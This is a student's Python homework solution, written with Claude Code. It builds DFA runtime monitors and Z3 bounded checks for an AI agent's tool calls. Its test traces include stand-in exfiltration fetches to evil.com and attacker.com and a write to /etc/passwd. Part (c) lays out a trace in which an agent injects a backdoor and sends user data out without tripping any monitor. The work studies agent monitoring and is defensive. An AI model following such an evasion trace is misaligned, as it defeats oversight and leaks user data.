"""
CS292C Homework 2 — Problem 4: DFA Monitors + Bounded Trace Verification (20 pts)
===================================================================================
Part (a): Implement three stateful runtime monitors as DFAs.
Part (b): Verify the same properties using Z3 bounded model checking.
Part (c): Find a trace that passes all monitors but is still dangerous.

AI Attribution: Used Claude Code to implement the monitor classes and the bounded
Z3 encoding. The DFA monitors were pretty straightforward from lecture notes.
The bounded verification negation functions took some back and forth to get the
quantifier structure right (exists j such that forall i<j...). Came up with the
part (c) completeness gap trace myself by thinking about what the monitors dont check.
"""

from z3 import *
from dataclasses import dataclass

# ============================================================================
# Event Model
# ============================================================================

@dataclass
class ToolEvent:
    """A single tool-call event in an agent trace."""
    tool: str          # "file_read", "file_write", "shell_exec", "network_fetch"
    path: str          # target file/resource path
    is_sensitive: bool  # whether the target is sensitive

ALLOW = "ALLOW"
DENY = "DENY"


# ============================================================================
# Part (a): DFA Monitors — 8 pts
# ============================================================================

SANDBOX_DIR = "/project/"  # paths starting with this are "in sandbox"

class SandboxMonitor:
    """
    Policy: Deny any file_write where path does not start with SANDBOX_DIR.
    All other tool calls are allowed.

    2-state DFA: OK (accepting) → VIOLATION (rejecting, absorbing).
    Once in VIOLATION, all subsequent calls are denied.
    """

    def __init__(self):
        self.violated = False

    def step(self, event: ToolEvent) -> str:
        if self.violated:
            return DENY
        if event.tool == "file_write" and not event.path.startswith(SANDBOX_DIR):
            self.violated = True
            return DENY
        return ALLOW


class ReadBeforeWriteMonitor:
    """
    Policy: Deny any file_write to a path that has not been file_read first.

    Tracks a set of read paths. A file_write is denied only if that specific
    path hasn't been read. Does NOT enter an absorbing violation state —
    only the specific violating write is denied.
    """

    def __init__(self):
        self.read_paths: set[str] = set()

    def step(self, event: ToolEvent) -> str:
        if event.tool == "file_read":
            self.read_paths.add(event.path)
            return ALLOW
        if event.tool == "file_write":
            if event.path not in self.read_paths:
                return DENY
            return ALLOW
        return ALLOW


class NoExfilMonitor:
    """
    Policy: After any file_read of a sensitive resource, deny ALL subsequent
    network_fetch calls (regardless of target).

    2-state DFA: CLEAN → TAINTED (after sensitive read).
    In TAINTED state, network_fetch is denied; all other tools are allowed.
    """

    def __init__(self):
        self.tainted = False

    def step(self, event: ToolEvent) -> str:
        if event.tool == "file_read" and event.is_sensitive:
            self.tainted = True
        if event.tool == "network_fetch" and self.tainted:
            return DENY
        return ALLOW


class ComposedMonitor:
    """Runs all three monitors in parallel. Denies if ANY monitor denies."""

    def __init__(self):
        self.monitors = [SandboxMonitor(), ReadBeforeWriteMonitor(), NoExfilMonitor()]

    def step(self, event: ToolEvent) -> str:
        results = [m.step(event) for m in self.monitors]
        return DENY if DENY in results else ALLOW


# ============================================================================
# Part (a) continued: Test traces
# ============================================================================

def test_monitors():
    """Test the monitors on example traces."""

    print("=== Part (a): DFA Monitor Tests ===\n")

    # Trace 1: Should be fully allowed
    trace1 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/project/src/main.py", False),
        ToolEvent("shell_exec", "/project/run_tests.sh", False),
    ]

    # Trace 2: Should be denied by SandboxMonitor (write outside sandbox)
    trace2 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/etc/passwd", False),  # ← violation
    ]

    # Trace 3: Should be denied by ReadBeforeWriteMonitor (write without read)
    trace3 = [
        ToolEvent("file_write", "/project/src/new_file.py", False),  # ← no prior read
    ]

    # Trace 4: Should be denied by NoExfilMonitor (network after sensitive read)
    trace4 = [
        ToolEvent("file_read",     "/project/secrets/api_key.txt", True),  # sensitive!
        ToolEvent("network_fetch", "https://evil.com/exfil", False),       # ← denied
    ]

    for i, (trace, name) in enumerate([(trace1, "clean"), (trace2, "sandbox violation"),
                                        (trace3, "write-before-read"), (trace4, "exfiltration")], 1):
        cm = ComposedMonitor()
        results = []
        for event in trace:
            r = cm.step(event)
            results.append(r)

        print(f"  Trace {i} ({name}):")
        for event, r in zip(trace, results):
            print(f"    {event.tool:16s} {event.path:40s} → {r}")
        denied = any(r == DENY for r in results)
        print(f"    {'BLOCKED' if denied else 'ALLOWED'}\n")


# ============================================================================
# Part (b): Bounded Trace Verification with Z3 — 8 pts
# ============================================================================

# Tool encoding for Z3
FILE_READ_Z3 = 0
FILE_WRITE_Z3 = 1
SHELL_EXEC_Z3 = 2
NETWORK_FETCH_Z3 = 3

def make_symbolic_trace(K):
    """Create symbolic trace variables for K steps."""
    tool = [Int(f"tool_{i}") for i in range(K)]
    in_sandbox = [Bool(f"in_sandbox_{i}") for i in range(K)]
    is_sensitive = [Bool(f"is_sensitive_{i}") for i in range(K)]
    path_id = [Int(f"path_{i}") for i in range(K)]

    wf = []
    for i in range(K):
        wf.append(And(tool[i] >= 0, tool[i] <= 3))
        wf.append(And(path_id[i] >= 0, path_id[i] <= 9))

    return {'tool': tool, 'in_sandbox': in_sandbox,
            'is_sensitive': is_sensitive, 'path_id': path_id, 'K': K}, wf


def verify_property_bounded(name, K, prop_negation_fn):
    """
    Check if a property can be violated in any trace of length K.
    prop_negation_fn(trace) should return constraints asserting a violation exists.
    """
    trace, wf = make_symbolic_trace(K)
    s = Solver()
    s.add(wf)
    s.add(prop_negation_fn(trace))

    result = s.check()
    print(f"  {name} (K={K}): ", end="")
    if result == sat:
        m = s.model()
        print("VIOLATION FOUND:")
        for i in range(K):
            t = m.eval(trace['tool'][i]).as_long()
            names = {0: "file_read", 1: "file_write", 2: "shell_exec", 3: "net_fetch"}
            p = m.eval(trace['path_id'][i])
            sb = m.eval(trace['in_sandbox'][i], model_completion=True)
            se = m.eval(trace['is_sensitive'][i], model_completion=True)
            print(f"    step {i}: {names.get(t, '?'):12s} path={p} sandbox={sb} sensitive={se}")
    else:
        print("NO VIOLATION POSSIBLE (property holds for all traces)")
    print()


def part_b():
    """
    For each of the three properties, encode the NEGATION and use Z3 to
    find a violating trace (or prove none exists).
    """
    K = 8
    print(f"=== Part (b): Bounded Trace Verification (K={K}) ===\n")

    # Property 1: Sandbox — every file_write must have in_sandbox = True
    def negate_sandbox(trace):
        """There EXISTS a step where tool = FILE_WRITE and in_sandbox = False."""
        return [Or(*[
            And(trace['tool'][i] == FILE_WRITE_Z3, Not(trace['in_sandbox'][i]))
            for i in range(trace['K'])
        ])]

    # Property 2: Read-before-write — every file_write at step j to path p
    # must have a file_read at some step i < j to the same path p.
    def negate_read_before_write(trace):
        """
        There exists a step j where tool = FILE_WRITE and for ALL prior steps
        i < j, either tool[i] != FILE_READ or path_id[i] != path_id[j].
        """
        clauses = []
        for j in range(trace['K']):
            # No prior read of the same path
            if j == 0:
                no_prior_read = BoolVal(True)
            else:
                no_prior_read = And(*[
                    Or(trace['tool'][i] != FILE_READ_Z3,
                       trace['path_id'][i] != trace['path_id'][j])
                    for i in range(j)
                ])
            clauses.append(And(trace['tool'][j] == FILE_WRITE_Z3, no_prior_read))
        return [Or(*clauses)]

    # Property 3: No exfiltration — if file_read at step i is sensitive,
    # then no network_fetch at any step j > i.
    def negate_no_exfil(trace):
        """
        There exist steps i < j where tool[i] = FILE_READ, is_sensitive[i],
        and tool[j] = NETWORK_FETCH.
        """
        clauses = []
        for i in range(trace['K']):
            for j in range(i + 1, trace['K']):
                clauses.append(And(
                    trace['tool'][i] == FILE_READ_Z3,
                    trace['is_sensitive'][i],
                    trace['tool'][j] == NETWORK_FETCH_Z3
                ))
        return [Or(*clauses)] if clauses else [BoolVal(False)]

    verify_property_bounded("Sandbox", K, negate_sandbox)
    verify_property_bounded("Read-before-write", K, negate_read_before_write)
    verify_property_bounded("No-exfiltration", K, negate_no_exfil)

    # [EXPLAIN] DFA monitors check ONE concrete trace at runtime and can actually
    # stop the agent. Z3 bounded checking looks at ALL possible traces up to length K
    # but only at dev time, cant stop anything live.
    # so DFA misses traces that didnt happen, Z3 misses traces longer than K.
    # ideally you use both — Z3 to audit before deploying, monitors in production.


# ============================================================================
# Part (c): Monitor Completeness — 4 pts
# ============================================================================

def part_c():
    """
    Construct a trace of length 6 that is ACCEPTED by all three monitors but
    still violates a safety property not covered by any of the three monitors.
    """
    print("=== Part (c): Monitor Completeness ===\n")

    # This trace passes all three monitors but is dangerous:
    # The agent reads a non-sensitive file, writes malicious content to it,
    # then reads user data (non-sensitive) and exfiltrates it via network_fetch.
    # Since no sensitive file is ever read, NoExfilMonitor never triggers.
    trace = [
        ToolEvent("file_read",     "/project/src/app.py",        False),  # 1. Read source code
        ToolEvent("file_write",    "/project/src/app.py",        False),  # 2. Inject backdoor (read first ✓)
        ToolEvent("file_read",     "/project/data/users.csv",    False),  # 3. Read user data (non-sensitive)
        ToolEvent("file_read",     "/project/output/report.txt", False),  # 4. Read output (for write later)
        ToolEvent("file_write",    "/project/output/report.txt", False),  # 5. Write stolen data (read first ✓)
        ToolEvent("network_fetch", "https://attacker.com/exfil", False),  # 6. Exfiltrate (no sensitive read ✓)
    ]

    cm = ComposedMonitor()
    print("  Trace:")
    all_allowed = True
    for event in trace:
        r = cm.step(event)
        print(f"    {event.tool:16s} {event.path:40s} sens={event.is_sensitive} → {r}")
        if r == DENY:
            all_allowed = False

    print(f"\n  All allowed: {all_allowed}")

    # [EXPLAIN] the trace reads user data (marked non-sensitive), writes it out,
    # and sends it over the network. none of the monitors catch it because:
    # - sandbox monitor: writes are all in /project/, fine
    # - read-before-write: we read each file before writing to it, fine
    # - no-exfil: only triggers on sensitive reads, but users.csv is non-sensitive
    #
    # the problem is none of them track where data actually FLOWS. they just
    # check individual events. you'd need a taint propagation monitor that
    # tracks "this data came from a file read" even if it wasnt labeled sensitive.
    print()


# ============================================================================
if __name__ == "__main__":
    test_monitors()
    part_b()
    part_c()
